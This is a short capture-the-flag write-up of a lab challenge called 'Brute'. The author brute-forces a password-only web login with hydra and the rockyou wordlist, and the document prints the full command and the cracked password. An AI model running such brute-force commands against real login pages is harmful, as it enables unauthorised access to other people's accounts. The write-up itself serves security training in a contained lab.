# Brute

## Overview

- Overall difficulty for me: Very easy

**In this challenge, we can spawn a docker instance:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027082238.png)

## Find the flag

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027082301.png)

**Looks like we need to brute force the login page!**

**To do so, I'll use `hydra`:**

When we typed an incorrect password, it shows us **`Incorrect Password!` error**, and **the POST request data is `password=<password_here>`.**

![](https://github.com/siunam321/CTF-Writeups/blob/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027082418.png)

**Armed with this information, we can use `hydra` to brute force it:**
```
┌──(root🌸siunam)-[~/ctf/GuidePoint-Security-Oct27-2022/Web/Brute]
└─# hydra -l 'any_user' -P /usr/share/wordlists/rockyou.txt 10.10.100.200 -s 37825 http-post-form "/:password=^PASS^:Incorrect Password"
[...]
[37825][http-post-form] host: 10.10.100.200   login: any_user   password: princess13
```

**Find the password! Let's login!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027083137.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/GuidePoint-Security-Oct27-2022/images/Pasted%20image%2020221027083144.png)

We found the flag!

# Conclusion

What we've learned:

1. Brute Forcing HTTP Login Page via `hydra`